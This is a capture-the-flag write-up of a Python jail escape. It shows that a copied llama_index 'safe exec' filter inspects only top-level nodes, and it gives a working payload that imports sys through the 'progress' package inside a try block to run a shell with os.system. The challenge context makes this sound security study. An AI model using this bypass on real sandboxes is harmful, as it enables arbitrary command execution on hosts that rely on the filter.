# llama-jail

yet another jail by other quasar

## challenge

I was sent this cool library by a friend of mine, and found some bugs in their "safe" exec function. Can you too find the fun escape?

see [llama-jail.zip](./llama-jail.zip)

## (unintended) solution

we take a look at the challenge and see the commented out statement 

```py
# code from https://github.com/run-llama/llama_index/blob/35afb6b93476ef4f4d61a48d847cd0b191ac5cb6/llama-index-experimental/llama_index/experimental/exec_utils.py
# was main at the time of writing chall, however commit provided incase of changes
```

the `exec_util.py` file is pretty much exactly the same as the one found in the llama repo

at this point i had no clue what to do because it appeared that all imports were banned and most useful builtins were also banned. luckily, there was an unintended solution and a revenge chall was created.

i just diffed the revenge with the original and saw that the revenge replaces ast.iter_child_nodes with ast.walk

so other quasar did not realize that the source code that was ripped from llama repo used ast.iter_child_nodes, meaning any imports done in another block that is not the module would work (iter child nodes only does the direct children of a node)

this is show below

```py
def _contains_protected_access(code: str) -> bool:
    # do not allow imports
    imports_modules = False
    tree = ast.parse(code)
    for node in ast.iter_child_nodes(tree):
        if isinstance(node, ast.Import):
            imports_modules = True
        elif isinstance(node, ast.ImportFrom):
            imports_modules = True
        else:
            continue

    dunder_visitor = DunderVisitor()
    dunder_visitor.visit(tree)

    for vulnerable_code_snippet in vulnerable_code_snippets:
        if vulnerable_code_snippet in code:
            dunder_visitor.has_access_to_disallowed_builtin = True

    return (
        dunder_visitor.has_access_to_private_entity
        or dunder_visitor.has_access_to_disallowed_builtin
        or imports_modules
    )
```

we can just use a try except to enter a different block

my payload so far is below

```py
try:
    # import something here idk
    pass
except:
    pass
#EOF
```

also i saw that the Dockerfile was as below

```py
FROM python:slim AS app
RUN pip install --no-cache-dir progress

FROM pwn.red/jail
COPY --from=app / /srv
COPY chall.py /srv/app/run
RUN chmod +x /srv/app/run
COPY exec_utils.py /srv/app/exec_utils.py
COPY flag.txt /srv/flag.txt
# apparently im bad at docker so i stole this from kmh
RUN chmod 444 /srv/flag.txt && mv /srv/flag.txt /srv/flag.`tr -dc A-Za-z0-9 < /dev/urandom | head -c 20`.txt
ENV JAIL_MEM=20M
```

interestingly, the package `progress` is installed.

taking a look at the [source code](https://github.com/verigak/progress/blob/master/progress/bar.py), we can see that the bar.py imports `sys` at the top

![bar py img](https://github.com/quasar098/pyjail-collection/assets/70716985/19b886de-a659-4f15-b432-da5b356bc7c9)

so, now my payload is

```py
try:
    from progress.bar import sys
    sys.modules['\x5f\x5fbuiltins\x5f\x5f'].breakpoint()
except:
    pass
#EOF
```

however, the DunderVisitor does not allow us to use any attributes which have the same name as a banned builtins attribute

```py
class DunderVisitor(ast.NodeVisitor):
    def __init__(self) -> None:
        self.has_access_to_private_entity = False
        self.has_access_to_disallowed_builtin = False

        builtins = globals()["__builtins__"].keys()
        self._builtins = builtins

    def visit_Name(self, node: ast.Name) -> None:
        if node.id.startswith("_"):
            self.has_access_to_private_entity = True
        if node.id not in ALLOWED_BUILTINS and node.id in self._builtins:
            self.has_access_to_disallowed_builtin = True
        self.generic_visit(node)

    def visit_Attribute(self, node: ast.Attribute) -> None:
        if node.attr.startswith("_"):
            self.has_access_to_private_entity = True
        if node.attr not in ALLOWED_BUILTINS and node.attr in self._builtins:
            self.has_access_to_disallowed_builtin = True
        self.generic_visit(node)
```

so we can just use `os` module and spawn a shell

```py
try:
    from progress.bar import sys
    print(sys.modules['os'].system('sh'))
except:
    pass
#EOF
```

we use this on remote to get the flag
